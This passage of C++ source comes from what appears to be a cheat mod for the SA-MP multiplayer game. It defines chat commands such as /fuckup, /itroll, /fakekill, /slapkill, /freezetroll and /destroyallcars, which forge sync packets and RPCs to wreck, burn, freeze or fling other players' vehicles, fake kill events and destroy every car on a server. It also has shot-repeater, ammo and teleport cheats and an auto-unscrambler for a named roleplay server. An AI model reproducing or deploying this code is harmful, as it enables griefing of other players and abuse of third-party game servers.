		uint16_t	playerID = uint16_t(-1);
		short		sPos[3] = { 0, 0, 0 };
		bool		bIsPlayerActive = false;

		bs.IgnoreBits(8);
		bs.Read(iNumberOfPlayers);
		if (iNumberOfPlayers < 0 || iNumberOfPlayers > SAMP_MAX_PLAYERS)
			return true;

		for (int i = 0; i < iNumberOfPlayers; i++)
		{
			bs.Read(playerID);
			bs.ReadCompressed(bIsPlayerActive);
			if (bIsPlayerActive == 0 || isBadSAMPPlayerID(playerID))
				continue;
			bs.Read(sPos);
			g_stStreamedOutInfo.iPlayerID[playerID] = playerID;
			g_stStreamedOutInfo.fPlayerPos[playerID][0] = sPos[0];
			g_stStreamedOutInfo.fPlayerPos[playerID][1] = sPos[1];
			g_stStreamedOutInfo.fPlayerPos[playerID][2] = sPos[2];
		}
	}
	return true;
}

// commands below

void cmd_change_server(char *param)	// 127.0.0.1 7777 Username Password
{
	traceLastFunc("cmd_change_server()");

	

	bool	success = false;

	char	IP[128], Nick[SAMP_MAX_PLAYER_NAME], Password[128] = "", Port[128];
	int		iPort;

	int ipc = sscanf(param, "%s%s%s%s", IP, Port, Nick, Password);
	if (ipc < 2)
	{
		addMessageToChatWindow("USAGE: /change_server <ip> <port> <Username> <Server Password>");
		addMessageToChatWindow("Variables that are set to \"NULL\" (capitalized) will be ignored.");
		addMessageToChatWindow("If you set the Password to \"NULL\" it is set to <no server password>.");
		addMessageToChatWindow("Username and password can also be left out completely.");
		return;
	}
	if (stricmp(IP, "NULL") == NULL)
		strcpy(IP, g_SAMP->szIP);

	if (stricmp(Port, "NULL") == NULL)
		iPort = g_SAMP->ulPort;
	else
		iPort = atoi(Port);

	if (ipc > 2)
	{
		if (stricmp(Nick, "NULL") != NULL)
		{
			if (strlen(Nick) > SAMP_ALLOWED_PLAYER_NAME_LENGTH)
				Nick[SAMP_ALLOWED_PLAYER_NAME_LENGTH] = '\0';
			setLocalPlayerName(Nick);
		}
	}
	if (ipc > 3)
	{
		if (stricmp(Password, "NULL") == NULL)
			strcpy(Password, "");
	}

	changeServer(IP, iPort, Password);
}

void cmd_change_server_fav(char *param)
{
	traceLastFunc("cmd_change_server_fav()");

	if (strlen(param) == 0)
	{
		addMessageToChatWindow("/fav_server <server name/part of server name>");
		addMessageToChatWindow("In order to see the favorite server list type: /fav_server list");
		return;
	}

	if (strncmp(param, "list", 4) == 0)
	{
		int count = 0;
		for (int i = 0; i < INI_SERVERS_MAX; i++)
		{
			if (set.server[i].server_name == NULL)
				continue;

			count++;
			addMessageToChatWindow("%s", set.server[i].server_name);
		}
		if (count == 0)
			addMessageToChatWindow("No servers in favorite server list. Edit the ini file to add some.");
		return;
	}

	for (int i = 0; i < INI_SERVERS_MAX; i++)
	{
		if (set.server[i].server_name == NULL || set.server[i].ip == NULL
			|| strlen(set.server[i].ip) < 7 || set.server[i].port == 0)
			continue;

		if (!findstrinstr((char *)set.server[i].server_name, param))
			continue;

		if (!set.use_current_name)
			setLocalPlayerName(set.server[i].nickname);

		changeServer(set.server[i].ip, set.server[i].port, set.server[i].password);

		return;
	}

	addMessageToChatWindow("/fav_server <server name/part of server name>");
	return;
}

void cmd_current_server(char *param)
{
	addMessageToChatWindow("Server Name: %s", g_SAMP->szHostname);
	addMessageToChatWindow("Server Address: %s:%i", g_SAMP->szIP, g_SAMP->ulPort);
	addMessageToChatWindow("Username: %s", getPlayerName(g_Players->sLocalPlayerID));
}

void cmd_tele_loc(char *param)
{
	if (strlen(param) == 0)
	{
		addMessageToChatWindow("USAGE: /tele_loc <location name>");
		addMessageToChatWindow("Use /tele_locations to show the location names.");
		addMessageToChatWindow("The more specific you are on location name the better the result.");
		return;
	}

	for (int i = 0; i < STATIC_TELEPORT_MAX; i++)
	{
		if (strlen(set.static_teleport_name[i]) == 0 || vect3_near_zero(set.static_teleport[i].pos))
			continue;

		if (!findstrinstr(set.static_teleport_name[i], param))
			continue;

		cheat_state_text("Teleported to: %s.", set.static_teleport_name[i]);
		cheat_teleport(set.static_teleport[i].pos, set.static_teleport[i].interior_id);
		return;
	}

	addMessageToChatWindow("USAGE: /tele_loc <location name>");
	addMessageToChatWindow("Use /tele_locations to show the location names.");
	addMessageToChatWindow("The more specific you are on location name the better the result.");
}

void cmd_tele_locations(char *)
{
	for (int i = 0; i < STATIC_TELEPORT_MAX; i++)
	{
		if (strlen(set.static_teleport_name[i]) == 0 || vect3_near_zero(set.static_teleport[i].pos))
			continue;
		addMessageToChatWindow("%s", set.static_teleport_name[i]);
	}

	addMessageToChatWindow("To teleport use the menu or: /tele_loc <location name>");
}

void cmd_pickupid(char *params)
{
	if (!strlen(params))
	{
		addMessageToChatWindow("USAGE: /pickupid <pickup id>");
		return;
	}

	g_RakClient->SendPickUp(atoi(params));
}

void cmd_setclass(char *params)
{
	if (!strlen(params))
	{
		addMessageToChatWindow("USAGE: /setclass <class id>");
		return;
	}

	g_RakClient->RequestClass(atoi(params));
	g_RakClient->SendSpawn();
}

void cmd_fakekill(char *params)
{
	int killer, reason, amount;
	if (!strlen(params) || sscanf(params, "%d%d%d", &killer, &reason, &amount) < 3)
		return addMessageToChatWindow("USAGE: /fakekill <killer id> <reason> <amount>");

	if (amount < 1 || killer < 0 || killer > SAMP_MAX_PLAYERS)
		return;

	for (int i = 0; i < amount; i++)
		g_RakClient->SendDeath(killer, reason);
}

void cmd_fuckup(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /fuckup <player id>");

	int playerid = atoi(params);

	if (playerid == 65535)
	{
		fuckupWorking = -1;
	}

	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist");


	if (g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr
		|| g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr)
	{
		if(!ValidPlayer(playerid)) return addMessageToChatWindow("Player is not streamed in.");
	}

	if (fuckupWorking != -1) return addMessageToChatWindow("Please wait before spamming more fuckups.");

	memset(&fuckupLdata, 0, sizeof(stInCarData));

	if (ValidPlayer(playerid))
	{
		if (getPlayerState(playerid) == PLAYER_STATE_DRIVER || getPlayerState(playerid) == PLAYER_STATE_PASSENGER)
		{
			uint16_t sTargetVehicleID = getSAMPVehicleIDFromGTAVehicle(g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle);
			
			if (ValidVehicle(sTargetVehicleID))
			{
				fuckupLdata.sVehicleID = sTargetVehicleID;
				fuckupLdata.fVehicleHealth = g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fVehicleHealth;
				vect4_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fQuaternion, fuckupLdata.fQuaternion);
				vect3_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fPosition, fuckupLdata.fPosition);
				vect3_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fMoveSpeed, fuckupLdata.fMoveSpeed);
				fuckupLdata.fVehicleHealth = 0.0f;
				fuckupLdata.fQuaternion[0] = 0.807107;
				fuckupLdata.fQuaternion[1] = -0.807107;
				fuckupLdata.fQuaternion[2] = 0;
				fuckupLdata.fQuaternion[3] = 0;
				fuckupLdata.fMoveSpeed[0] = random_float(0, 50);
				fuckupLdata.fMoveSpeed[1] = random_float(0, 50);
				fuckupLdata.fMoveSpeed[2] = 50;
				if (cheat_state->state != CHEAT_STATE_VEHICLE)
				{
					HookedRakClientInterface* intfc = (HookedRakClientInterface*)g_SAMP->pRakClientInterface;
					fuckupWorking = GetTickCount() + intfc->GetLastPing() + 20;

					BitStream bsEnterVeh;
					bsEnterVeh.Write(fuckupLdata.sVehicleID);
					bsEnterVeh.Write((UINT8)1);
					g_RakClient->RPC(RPC_EnterVehicle, &bsEnterVeh);

					stPassengerData dataN;
					memset(&dataN, 0, sizeof(stPassengerData));
					dataN.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
					dataN.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
					dataN.byteSeatID = getVehicleEmptySeat(g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle);
					vect3_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fPosition, dataN.fPosition);
					dataN.sVehicleID = g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.sVehicleID;
					BitStream bsN;
					bsN.ResetWritePointer();
					bsN.Write((BYTE)ID_PASSENGER_SYNC);
					bsN.Write((PCHAR)&dataN, sizeof(stPassengerData));
					g_RakClient->Send(&bsN, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);
				}
				else
				{
					addMessageToChatWindow("Fucked %s up.", getPlayerName(playerid));
					SendFakeDriverFullSyncData(&fuckupLdata, 0);
				}
			}
			else
			{
				return addMessageToChatWindow("Target's vehicle is not valid!");
			}
		}
		else
		{
			return addMessageToChatWindow("Target is not driving!");
		}
	}
	else
	{
		return addMessageToChatWindow("Target is not valid!");
	}
}

void cmd_itroll(char* params)
{
	int playerid, mode;

	int ipc = sscanf(params, "%d%d", &playerid, &mode);
	if (ipc < 2)
		return addMessageToChatWindow("USAGE: /itroll <player id> <mode>");

	if (playerid == 65535)
	{
		iTrollMode = -1;
		iTrollWorking = -1;
	}

	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist");


	if (g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr
		|| g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr)
	{
		if (!ValidPlayer(playerid)) return addMessageToChatWindow("Player is not streamed in.");
	}

	if (iTrollWorking > -1) return addMessageToChatWindow("Please wait before for iTroll to finish as it cant be spammed.");

	memset(&iTrollData, 0, sizeof(stInCarData));

	if (ValidPlayer(playerid))
	{
		if (getPlayerState(playerid) == PLAYER_STATE_DRIVER || getPlayerState(playerid) == PLAYER_STATE_PASSENGER)
		{
			uint16_t sTargetVehicleID = getSAMPVehicleIDFromGTAVehicle(g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle);

			if (ValidVehicle(sTargetVehicleID))
			{
				iTrollData.sVehicleID = sTargetVehicleID;
				iTrollData.fVehicleHealth = g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fVehicleHealth;
				vect4_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fQuaternion, iTrollData.fQuaternion);
				vect3_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fPosition, iTrollData.fPosition);
				vect3_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fMoveSpeed, iTrollData.fMoveSpeed);

				switch (mode)
				{
				case 1: // mode: stuck in the ground
				{
					struct actor_info* ainfo = getGTAPedFromSAMPPlayerID(playerid);

					if (ainfo != NULL)
					{
						CPed* pPed = pGameInterface->GetPools()->GetPed((DWORD*)ainfo);
						float fGroundZHeight = pGame->GetWorld()->FindGroundZFor3DPosition(pPed->GetPosition());

						iTrollData.fPosition[2] = fGroundZHeight - 0.25f;

						iTrollData.fQuaternion[0] = 0.707107;
						iTrollData.fQuaternion[1] = -0.707107;
						iTrollData.fQuaternion[2] = 0;
						iTrollData.fQuaternion[3] = 0;
					}
					break;
				}
				case 2: // mode: speed up
				{
					struct actor_info* ainfo = getGTAPedFromSAMPPlayerID(playerid);

					if (ainfo != NULL)
					{
						iTrollData.fMoveSpeed[0] = sinf(-ainfo->fCurrentRotation) * 3.5;
						iTrollData.fMoveSpeed[1] = cosf(-ainfo->fCurrentRotation) * 3.5;
					}
					break;
				}
				case 3: // mode: burn up and throw down
				{
					float* coords = (cheat_state->state == CHEAT_STATE_VEHICLE) ? cheat_state->vehicle.coords : cheat_state->actor.coords;
					iTrollData.fVehicleHealth = 0.0f;
					iTrollData.fPosition[0] = coords[0] + random_float(20, 25);
					iTrollData.fPosition[1] = coords[1] + random_float(20, 25);
					iTrollData.fPosition[2] = coords[2] + random_float(10, 15);
					iTrollData.fMoveSpeed[2] = -(random_float(4, 10));
					break;
				}
				case 4: // mode: burn up and throw up
				{
					iTrollData.fVehicleHealth = 0.0f;
					iTrollData.fMoveSpeed[0] = random_float(0, 2);
					iTrollData.fMoveSpeed[1] = random_float(0, 2);
					iTrollData.fMoveSpeed[2] = random_float(4, 10);
					break;
				}
				case 5: // mode: spin
				{
					struct vehicle_info* vinfo = getGTAVehicleFromSAMPVehicleID(sTargetVehicleID);
					if (vinfo != NULL)
					{
						tVector right, up, at;
						float fRight[3], fUp[3];
						vect3_copy(&vinfo->base.matrix[4 * 0], fRight);
						vect3_copy(&vinfo->base.matrix[4 * 1], fUp);
						vect3_invert(fRight, fRight);
						vect3_invert(fUp, fUp);
						right.X = fRight[0];
						right.Y = fRight[1];
						right.Z = fRight[2];
						up.X = fUp[0];
						up.Y = fUp[1];
						up.Z = fUp[2];
						at.X = vinfo->base.matrixStruct->at.X;
						at.Y = vinfo->base.matrixStruct->at.Y;
						at.Z = vinfo->base.matrixStruct->at.Z;
						MatrixToQuaternion(&right, &up, &at, iTrollData.fQuaternion[0], iTrollData.fQuaternion[1], iTrollData.fQuaternion[2], iTrollData.fQuaternion[3]);
						vect3_invert(iTrollData.fMoveSpeed, iTrollData.fMoveSpeed);
					}
					break;
				}
				case 6: // mode: send to ocean
				{
					struct vehicle_info* vinfo = getGTAVehicleFromSAMPVehicleID(sTargetVehicleID);
					if (vinfo != NULL)
					{
						iTrollData.fPosition[0] = 1088.58;
						iTrollData.fPosition[1] = -2852.38;
						iTrollData.fPosition[2] = -7.00;
					}
					break;
				}
				case 7: // mode: light speed up
				{
					struct actor_info* ainfo = getGTAPedFromSAMPPlayerID(playerid);

					if (ainfo != NULL)
					{
						iTrollData.fMoveSpeed[0] = sinf(-ainfo->fCurrentRotation) * 1.75;
						iTrollData.fMoveSpeed[1] = cosf(-ainfo->fCurrentRotation) * 1.75;
					}
					break;
				}
				}
				if (cheat_state->state != CHEAT_STATE_VEHICLE)
				{
					HookedRakClientInterface* intfc = (HookedRakClientInterface*)g_SAMP->pRakClientInterface;
					iTrollWorking = GetTickCount() + intfc->GetLastPing() + 20;
					iTrollMode = mode;				

					BitStream bsEnterVeh;
					bsEnterVeh.Write(iTrollData.sVehicleID);
					bsEnterVeh.Write((UINT8)1);
					g_RakClient->RPC(RPC_EnterVehicle, &bsEnterVeh);

					stPassengerData dataN;
					memset(&dataN, 0, sizeof(stPassengerData));
					dataN.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
					dataN.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
					dataN.byteSeatID = getVehicleEmptySeat(g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle);
					vect3_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fPosition, dataN.fPosition);
					dataN.sVehicleID = g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.sVehicleID;
					BitStream bsN;
					bsN.ResetWritePointer();
					bsN.Write((BYTE)ID_PASSENGER_SYNC);
					bsN.Write((PCHAR)& dataN, sizeof(stPassengerData));
					g_RakClient->Send(&bsN, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);
				}
				else
				{
					addMessageToChatWindow("Trolled %s.", getPlayerName(playerid));
					SendFakeDriverFullSyncData(&iTrollData, 0);
				}
			}
			else
			{
				return addMessageToChatWindow("Target's vehicle is not valid!");
			}
		}
		else
		{
			return addMessageToChatWindow("Target is not driving!");
		}
	}
	else
	{
		return addMessageToChatWindow("Target is not valid!");
	}
}

void cmd_freezestop(char *params)
{
	if (set.freeze)
	{
		set.freeze = 0;
		addMessageToChatWindow("Stopped freezing.");
	}
	else addMessageToChatWindow("You are not freezing anyone");
	return;
}

void cmd_freezetroll(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /fr <player id>");

	int playerid = atoi(params);
	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist");

	if (g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr
		|| g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr)
	{
		if (!ValidPlayer(playerid)) return addMessageToChatWindow("Player is not streamed in.");
	}
	if (cheat_state->state != CHEAT_STATE_VEHICLE)
	{
		return addMessageToChatWindow("You are not in a vehicle!");
	}

	if (ValidPlayer(playerid))
	{
		if (getPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			uint16_t sTargetVehicleID = g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.sVehicleID;
			if (ValidVehicle(sTargetVehicleID))
			{
				vect3_copy(g_Players->pRemotePlayer[playerid]->pPlayerData->inCarData.fPosition, set.freeze_pos);
				set.freeze_target = playerid;
				set.freeze = 1;
				addMessageToChatWindow("Freezing target, to stop freezing use /frstop");
			}
			else
			{
				return addMessageToChatWindow("Target's vehicle is not valid!");
			}
		}
		else
		{
			return addMessageToChatWindow("Target is not driving!");
		}
	}
	else
	{
		return addMessageToChatWindow("Target is not valid!");
	}
}

void cmd_slapkill(char* params)
{
	if (set.slapkill)
	{
		set.slapkill = 0;
		addMessageToChatWindow("Stopped slap killing.");
		return;
	}
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /slapkill <player id>");

	int playerid = atoi(params);
	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist");

	if (g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr
		|| g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr)
	{
		if (!ValidPlayer(playerid)) return addMessageToChatWindow("Player is not streamed in.");
	}

	if (ValidPlayer(playerid))
	{
		set.slapkill_target = playerid;
		set.slapkill = 1;
		addMessageToChatWindow("Slap killing target, to stop: /slapkill");
	}
	else
	{
		return addMessageToChatWindow("Target is not valid!");
	}
}

void cmd_shotrepeater(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /shotrepeater <value>");

	int srval = atoi(params);
	if (srval < 0 || srval > 100)
		return addMessageToChatWindow("Value is invalid! - Min: 0 Max: 100");

	set.shotrepeater = srval;
	addMessageToChatWindow("{FF6D70}Shot Repeater -> %d", set.shotrepeater);
}

void cmd_autounscrambler_delay(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /autouns_delay <delay>");

	int srval = atoi(params);
	if (srval < 0 || srval > 4000)
		return addMessageToChatWindow("Value is invalid! - Min: 0 Max: 4000");

	set.autounscramble_delay = srval;
	addMessageToChatWindow("{FF6D70}Auto Unscramble Delay -> %d", set.autounscramble_delay);
}

void cmd_autounscrambler(char *params)
{
	if (set.autounscramble)
	{
		set.autounscramble = 0;
		addMessageToChatWindow("{FF6D70}Auto Unscrambler (LSRP) -> {FF0000}OFF");
	}
	else
	{
		set.autounscramble = 1;
		addMessageToChatWindow("{FF6D70}Auto Unscrambler (LSRP) -> {00FF33}ON");
	}
}

void cmd_togglebighacks(char *params)
{
	if (set.noBigHacks)
	{
		set.noBigHacks = 0;
		addMessageToChatWindow("{FF6D70}You can now use big hacks like car trolls etc.");
	}
	else
	{
		set.noBigHacks = 1;
		addMessageToChatWindow("{00FF33}You cannot use big hacks like car trolls anymore!");
	}
}

void ReloadFriendlist()
{
	FriendsListLoaded = true;
	Friends.clear();
	std::ifstream file(M0D_FOLDER"friends.txt");
	if (!file.is_open())
	{
		std::ofstream dictFileEx(M0D_FOLDER"friends.txt");
		if (file.is_open())
		{
			dictFileEx << "[dont_remove_this]";
		}
		dictFileEx.close();
		FriendsListLoaded = false;
	}
	else
	{
		std::string temp;
		while (!file.eof())
		{
			file >> temp;
			Friends.push_back(temp);
		}
	}
	file.close();
}

void cmd_friendlist_reload(char *params)
{
	FriendsListLoaded = false;
	addMessageToChatWindow("{00FF33}Reloaded friend list.");
}

void cmd_friendlist_add(char *params)
{
	if (!FriendsListLoaded) return addMessageToChatWindow("Friends list is not loaded!");

	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /friendlist_add <name>");

	if (strlen(params) < 3 || strlen(params) > SAMP_MAX_PLAYER_NAME)
		return addMessageToChatWindow("Name cannot be less than 3 or more than %d characters!", SAMP_MAX_PLAYER_NAME);
	
	std::string name = params;
	Friends.push_back(name);
	std::remove(M0D_FOLDER"friends.txt");
	std::ofstream frenFile;
	frenFile.open(M0D_FOLDER"friends.txt");
	if (!frenFile.is_open()) return addMessageToChatWindow("Failed to open friends file!");
	for (unsigned int i = 0; i < Friends.size(); i++)
	{
		frenFile << "\n" << Friends[i];
	}
	frenFile.close();
	FriendsListLoaded = false;
	addMessageToChatWindow("{FF6D70}Added %s to friend list.", name.c_str());
}

void cmd_wordlist_add(char* params)
{
	if (!wordListLoaded) return addMessageToChatWindow("Word list is not loaded!");

	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /wordlist_add <name>");

	std::string name = params;
	wordList.push_back(name);
	std::remove(M0D_FOLDER"wordlist.txt");
	std::ofstream frenFile;
	frenFile.open(M0D_FOLDER"wordlist.txt");
	if (!frenFile.is_open()) return addMessageToChatWindow("Failed to open words file!");
	for (unsigned int i = 0; i < wordList.size(); i++)
	{
		frenFile << "\n" << wordList[i];
	}
	frenFile.close();
	wordListLoaded = false;
	addMessageToChatWindow("{00FF33}Added %s to word list.", name.c_str());
}

void cmd_friendlist_remove(char *params)
{
	if (!FriendsListLoaded) return addMessageToChatWindow("Friends list is not loaded!");

	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /friendlist_remove <name>");

	if (strlen(params) < 3 || strlen(params) > SAMP_MAX_PLAYER_NAME)
		return addMessageToChatWindow("Name cannot be less than 3 or more than %d characters!", SAMP_MAX_PLAYER_NAME);

	std::string name = params;
	std::remove(M0D_FOLDER"friends.txt");
	std::ofstream frenFile;
	frenFile.open(M0D_FOLDER"friends.txt");
	if (!frenFile.is_open()) return addMessageToChatWindow("Failed to open friends file!");
	for (unsigned int i = 0; i < Friends.size(); i++)
	{
		if (name.compare(Friends[i]) == 0) continue;
		frenFile << "\n" << Friends[i];
	}
	frenFile.close();
	FriendsListLoaded = false;
	addMessageToChatWindow("{FF6D70}Removed %s from friend list.", name.c_str());
}

void cmd_autounscrambler_reload(char *params)
{
	wordList.clear();
	wordListLoaded = false;
	_UnsLastWord = "";
	_UnsNewTick = -1;
	_UnsSolved = "";
	_UnsWork = false;
	addMessageToChatWindow("{00FF33}Reloaded Auto Unscrambler");
}

void cmd_dualshot(char *params)
{
	if (set.dShotStatus)
	{
		set.dShotStatus = 0;
		addMessageToChatWindow("{FF6D70}Dual Shot -> {FF0000}OFF");
	}
	else
	{
		set.dShotStatus = 1;
		addMessageToChatWindow("{FF6D70}Dual Shot -> {00FF33}ON");
	}
}

void cmd_dualshot_delay(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /dsdelay <value>");

	int srval = atoi(params);
	if (srval < 0 || srval > 2500)
		return addMessageToChatWindow("Value is invalid! - Min: 0 Max: 2500");

	set.dShotDelay = srval;
	addMessageToChatWindow("{FF6D70}Dual Shot Delay -> %d", set.dShotDelay);
}

eWeaponSlot getWeaponSlot(int wep)
{
	eWeaponSlot wepEx;
	wepEx = WEAPONSLOT_TYPE_UNARMED;
	if (wep >= 1 && wep <= 15 && wep != 14) wepEx = WEAPONSLOT_TYPE_MELEE;
	if (wep == 14) wepEx = WEAPONSLOT_TYPE_GIFT;
	if (wep >= 16 && wep <= 18) wepEx = WEAPONSLOT_TYPE_THROWN;
	if (wep >= 22 && wep <= 24) wepEx = WEAPONSLOT_TYPE_HANDGUN;
	if (wep >= 25 && wep <= 27) wepEx = WEAPONSLOT_TYPE_SHOTGUN;
	if (wep >= 28 && wep <= 29) wepEx = WEAPONSLOT_TYPE_SMG;
	if (wep >= 30 && wep <= 31) wepEx = WEAPONSLOT_TYPE_MG;
	if (wep == 32) wepEx = WEAPONSLOT_TYPE_SMG;
	if (wep >= 33 && wep <= 34) wepEx = WEAPONSLOT_TYPE_RIFLE;
	if (wep >= 35 && wep <= 38) wepEx = WEAPONSLOT_TYPE_SPECIAL;
	if (wep == 39) wepEx = WEAPONSLOT_TYPE_THROWN;
	if (wep == 40) wepEx = WEAPONSLOT_TYPE_DETONATOR;
	if (wep >= 41 && wep <= 45) wepEx = WEAPONSLOT_TYPE_SPECIAL;
	if (wep == 46) wepEx = WEAPONSLOT_TYPE_PARACHUTE;
	return wepEx;
}

void cmd_switchwep(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /switchwep <weapon id>");

	int weaponid = atoi(params);

	if (weaponid < 0 || weaponid > 46)
		return addMessageToChatWindow("Invalid weapon id!");

	pPedSelf->SetCurrentWeaponSlot(getWeaponSlot(weaponid));
}

void cmd_gmammo(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /gmammo <amount>");

	CWeapon *gWep = pPedSelf->GetWeapon(pPedSelf->GetCurrentWeaponSlot());
	gWep->SetAmmoTotal(gWep->GetAmmoTotal() + atoi(params));
}

void cmd_warp(char *params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /warp <player id>");

	int playerid = atoi(params);
	
	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist.");

	float pos[3];
	actor_info *actor = nullptr;
	if (g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr
		|| g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr)
	{
		if (vect3_near_zero(g_stStreamedOutInfo.fPlayerPos[playerid]))
			return addMessageToChatWindow("Player is not streamed in.");

		vect3_copy(g_stStreamedOutInfo.fPlayerPos[playerid], pos);
		pos[1] += 1.0f;
		cheat_teleport(pos, 0);
		return;
	}

	if (!getPlayerPos(playerid, pos) ||
		g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr ||
		g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr ||
		(actor = g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor->pGTA_Ped) == nullptr)
	{
		return addMessageToChatWindow("Bad player info.");
	}

	pos[1] += 1.0f;
	cheat_teleport(pos, actor->base.interior_id);
}

void cmd_pweps(char* params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /pweps <player id>");

	int playerid = atoi(params);

	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist.");

	float pos[3];
	actor_info* actor = nullptr;
	if (g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr
		|| g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr)
	{
		return addMessageToChatWindow("Player is not streamed in.");
	}

	if (!getPlayerPos(playerid, pos) ||
		g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr ||
		g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr ||
		(actor = g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor->pGTA_Ped) == nullptr)
	{
		return addMessageToChatWindow("Bad player info.");
	}

	addMessageToChatWindow("{FFFFFF}%s's weapons:", getPlayerName(playerid));

	char objName[256];
	for (int cursor = 0; cursor < 13; cursor++)
	{
		if (actor->weapon[cursor].id > 16 && actor->weapon[cursor].id < 38) {

			sprintf_s(objName, "%d", actor->weapon[cursor].id);

			const struct weapon_entry* weapon;
			for (weapon = weapon_list; weapon->name != NULL; weapon++)
			{
				if (weapon->id == actor->weapon[cursor].id)
				{
					sprintf_s(objName, "%s", weapon->name);
				}
			}

			addMessageToChatWindow("{FFFFFF}Slot [%d] {FF0000}%s [%d]", cursor, objName, actor->weapon[cursor].ammo);
		}
	}
}

void cmd_fpslimiter(char* params)
{
	*(BYTE*)0xBA6794 = !*(BYTE*)0xBA6794;
	if(*(BYTE*)0xBA6794 == 0)
		addMessageToChatWindow("{FFFFFF}Frame Limiter {FF0000}OFF");
	else
		addMessageToChatWindow("{FFFFFF}Frame Limiter {00FF33}ON");
}

void cmd_showCMDS(char *)
{
	for (int i = 0; i < g_m0dCmdNum; i++)
	{
		addMessageToChatWindow("%s", g_m0dCmdlist[i]);
	}
}

void threadDestroyAllCars()
{
	for (int i = 0; i < SAMP_MAX_VEHICLES; i++)
	{
		BitStream bsMsg;

		if (cheat_state->state == CHEAT_STATE_VEHICLE && i == g_Players->pLocalPlayer->sCurrentVehicleID)
			continue;

		bsMsg.Write(i);

		g_RakClient->RPC(RPC_VehicleDestroyed, &bsMsg);
		Sleep(5);
	}
}

void cmd_destroyallcars(char* params)
{
	std::thread(threadDestroyAllCars).detach();
	addMessageToChatWindow("Destroying all cars.");
	return;
}

void cmd_playervehicle(char* params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /pveh <player id>");

	int playerid = atoi(params);

	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist.");

	actor_info* actor = nullptr;

	if (
		g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr ||
		g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr ||
		(actor = g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor->pGTA_Ped) == nullptr)
	{
		return addMessageToChatWindow("Player not streamed/exists.");
	}

	if (getPlayerState(playerid) == PLAYER_STATE_DRIVER || getPlayerState(playerid) == PLAYER_STATE_PASSENGER)
	{
		addMessageToChatWindow("%s's vehicle ID: %d", getPlayerName(playerid), getPlayerSAMPVehicleID(playerid));
	}
